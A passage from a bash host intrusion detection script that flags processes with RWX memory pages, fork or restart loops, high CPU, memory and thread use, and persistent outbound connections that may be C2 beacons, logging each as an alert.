  if echo " ${JIT_RUNTIMES:-} " | grep -qw "$exe_base"; then
    continue
  fi

  # Fast reject: no RWX anywhere
  grep -q 'rwxp ' "$maps" 2>/dev/null || continue

  pid_num=$(basename "$pid_path")
  user=$(stat -c '%U' "$pid_path" 2>/dev/null)
  alert "WARNING" "process" \
    "Process has RWX memory pages (possible shellcode): exe=$exe user=$user PID $pid_num"
  echo "$(date -Iseconds)|process|rwx_pages|pid=$pid_num|user=$user|exe=$exe" \
    >> "$HIDS_DIR/logs/raw_events.log"
done

# ============================================================================
# 20. RESTART LOOP / FORK STORM
# ============================================================================
# Cryptominers and some malware spawn many instances of the same binary
# to either (a) sidestep a single-process kill or (b) mine on every core.
# We count processes per exe basename; high counts are suspicious.

ps -eo comm --no-headers 2>/dev/null | \
  sort | uniq -c | sort -rn | \
  awk -v max="${RESTART_LOOP_MAX:-20}" '$1 > max {print $1"|"$2}' | \
  while IFS='|' read -r n name; do
    [[ -z "$name" ]] && continue
    # Skip known-legit forkers
    case "$name" in
      apache2|httpd|nginx|php-fpm*|postgres|mysqld|kworker*|scsi_eh*) continue ;;
    esac
    alert "WARNING" "process" \
      "Possible fork/restart loop: $n instances of '$name'"
    echo "$(date -Iseconds)|process|fork_loop|comm=$name|count=$n" \
      >> "$HIDS_DIR/logs/raw_events.log"
  done

# ============================================================================
# 21. RESOURCE ANOMALIES (CPU / MEM / THREADS)
# ============================================================================
# Snapshot-based: we alert when a single process currently exceeds a
# threshold. This catches cryptominers (sustained 100% CPU) and fork
# bombs (thousands of threads).

ps -eo pid,user,%cpu,%mem,nlwp,comm --no-headers 2>/dev/null | \
  while read -r pid user pcpu pmem nlwp comm; do
    [[ -z "$pid" ]] && continue

    pcpu_int=${pcpu%.*}
    pmem_int=${pmem%.*}

    if (( pcpu_int >= ${CPU_WARN_PERCENT:-80} )); then
      alert "WARNING" "process" \
        "High CPU: $comm (PID $pid user=$user cpu=${pcpu}%)"
      echo "$(date -Iseconds)|process|high_cpu|pid=$pid|user=$user|comm=$comm|cpu=$pcpu" \
        >> "$HIDS_DIR/logs/raw_events.log"
    fi

    if (( pmem_int >= ${MEM_WARN_PERCENT:-50} )); then
      alert "WARNING" "process" \
        "High memory: $comm (PID $pid user=$user mem=${pmem}%)"
      echo "$(date -Iseconds)|process|high_mem|pid=$pid|user=$user|comm=$comm|mem=$pmem" \
        >> "$HIDS_DIR/logs/raw_events.log"
    fi

    if (( nlwp >= ${THREAD_WARN_COUNT:-500} )); then
      alert "WARNING" "process" \
        "High thread count: $comm (PID $pid user=$user threads=$nlwp)"
      echo "$(date -Iseconds)|process|high_threads|pid=$pid|user=$user|comm=$comm|threads=$nlwp" \
        >> "$HIDS_DIR/logs/raw_events.log"
    fi
  done

# ============================================================================
# 22. C2 BEACONING HEURISTIC
# ============================================================================
# We record every non-local ESTABLISHED outbound destination per cycle in
# run/conn_history.txt (one line per cycle, CSV). On each run we also
# read the last N lines and count how many cycles each remote IP appeared
# in. If the same IP shows up in >= BEACON_MIN_CYCLES consecutive cycles
# → candidate beacon.
#
# Limitations honestly acknowledged:
#   - Does not measure periodicity (just persistence across cycles).
#   - Long-lived legitimate connections (e.g. SSH session) will match
#     too — operators should whitelist known remotes over time.

BEACON_STATE_DIR="$HIDS_DIR/run"
BEACON_LOG="$BEACON_STATE_DIR/conn_history.txt"
mkdir -p "$BEACON_STATE_DIR"

# Current snapshot: ESTABLISHED outbound, remote IP only (strip :port)
# ss -tn state established: shows remote address in column 5
current_remotes=$(ss -tn state established 2>/dev/null | \
  awk 'NR>1 {print $5}' | awk -F: '{
    # IPv6 has multiple colons; the IP is everything except the last :port
    n=NF; ip=$1; for (i=2; i<n; i++) ip=ip":"$i
    print ip
  }' | sort -u | \
  grep -v -E '^(127\.|::1|fe80:|0\.0\.0\.0)' )

# Record this cycle
if [[ -n "$current_remotes" ]]; then
  ts=$(date +%s)
  while read -r ip; do
    [[ -z "$ip" ]] && continue
    echo "$ts|$ip" >> "$BEACON_LOG"
  done <<< "$current_remotes"
fi

# Keep only the last 500 lines to bound file growth
if [[ -f "$BEACON_LOG" ]]; then
  tail -n 500 "$BEACON_LOG" > "$BEACON_LOG.tmp" && mv "$BEACON_LOG.tmp" "$BEACON_LOG"
fi

# Count per-IP occurrences across the last 50 recorded cycles
if [[ -f "$BEACON_LOG" ]]; then
  recent=$(tail -n 50 "$BEACON_LOG" | awk -F'|' '{print $1}' | sort -u | wc -l)
  # Count how many distinct cycles each IP appeared in
  awk -F'|' -v min="${BEACON_MIN_CYCLES:-3}" '
    { seen[$2","$1]=1 }
    END {
      for (k in seen) {
        split(k, a, ",")
        ip_count[a[1]]++
      }
      for (ip in ip_count) {
        if (ip_count[ip] >= min) printf "%s|%d\n", ip, ip_count[ip]
      }
    }' "$BEACON_LOG" | \
  while IFS='|' read -r ip n; do
    [[ -z "$ip" ]] && continue
    alert "WARNING" "network" \
      "Possible C2 beacon: $ip seen in $n monitoring cycles"
    echo "$(date -Iseconds)|network|beacon|ip=$ip|cycles=$n" \
      >> "$HIDS_DIR/logs/raw_events.log"
  done
fi
